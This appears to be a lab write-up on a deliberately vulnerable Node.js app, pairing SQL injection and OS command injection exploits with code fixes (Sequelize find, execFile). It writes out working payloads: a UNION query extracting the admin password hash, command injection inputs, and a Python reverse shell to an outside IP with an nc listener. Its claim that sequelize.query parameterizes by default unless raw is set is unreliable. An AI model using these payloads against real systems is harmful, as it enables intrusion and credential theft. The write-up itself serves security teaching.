# sql Injection
## Exploiting error based SQL injection

### Get the result of first user without knowing any user name with sqli
```
' or '1'='1
```

### Exfiltrate admin password hash
```
' UNION SELECT password,1 from Users where login='admin' -- //
```


---
## The Vulnerability 

No input validation or sanitization for user controlled inputs

`db.sequelize.query` is a method in the Sequelize ORM (Object-Relational Mapping) library for Node.js that can be used to execute raw SQL queries against a database.

<p>
By default, db.sequelize.query will use parameterized queries, meaning that any input values will be automatically escaped and treated as parameters rather than being concatenated into the SQL string. This helps to prevent SQL injection attacks and makes the query more efficient, as the database can cache the execution plan for the query.

However, it is possible to disable parameterization and use raw SQL queries by passing the `raw: true` option to the db.sequelize.query method. In this case, you should be careful to manually escape any input values to prevent SQL injection vulnerabilities.
</p>

You can check if the raw option is set to true or not by looking at the second parameter of the db.sequelize.query method.

If the second parameter is an object that contains a raw property set to true, then the query is a raw SQL query. For example:
![image](https://user-images.githubusercontent.com/120215854/233464025-25a66d2b-685f-4b6f-bb59-1ab16c589e38.png)

On the other hand, if the second parameter is not an object, or if it is an object that does not contain a raw property set to true, then the query is a parameterized query. For example:
![image](https://user-images.githubusercontent.com/120215854/233464100-51b4295b-3303-4966-9574-53301f8906e8.png)


<br>

---

## The fix

We can use `model's` `find` function and rely on in-built input sanitization of sequelize.

### Edits to the `core\appHandler.js`

```js
module.exports.userSearch = function (req, res) {
//Comment out the following lines 
	//var query = "SELECT name,id FROM Users WHERE login='" + req.body.login + "'";
	//db.sequelize.query(query, {
	//	model: db.User
	//}).then(user => {
	//	if (user.length) {
		db.User.find({where:{'login':req.body.login}}).then(user => {
			if (user) {
			var output = {
				user: {
					//name: user[0].name,
					//id: user[0].id
					name: user.name,
					id: user.id
				}
			}
			res.render('app/usersearch', {
				output: output
			})
		} else {
			req.flash('warning', 'User not found')
			res.render('app/usersearch', {
				output: null
			})
		}
	}).catch(err => {
		//req.flash('danger', 'Internal Error')
		req.flash('yei', 'Fixed it')
		res.render('app/usersearch', {
			output: null
		})
	})
}
```


---

<br><br>

# OS Command Injection

## Exploiting
##### Intended behaviour
```
Enter a valid IP
8.8.8.8
```
##### Exploiting by appending a OS command 
```
# List the files
8.8.8.8, ls

# Get the effective username of the current user when invoked
8.8.8.8, whoami
```

##### Getting a reverse shell
```
# Start a listener on your public IP
nc -nlvp 4444

# Run the following in vulnerable app function
8.8.8.8; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("138.68.66.98",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' 
```


### Vulnerability 

~~~
'exec' method can execute arbitrary OS commands
~~~


### The fix

~~~
We can use `exec_file` or `spawn` method under child_process which will prevent arbitrary command execution.
~~~

### Edits to the `core\appHandler.js`

```js
// Remove the following line or replace 'exec' with 'execFile'
const exec = require('child_process').exec;

// Add the follwing line 
const execFile = require('child_process').execFile;
```

Then 
```js
// Remove/Replace the line 
exec('ping -c 2 ' + req.body.address, function (err, stdout, stderr) {

// Add the line
execFile('ping', ['-c', '2', req.body.address] , function(err,stdout,stderr){
```



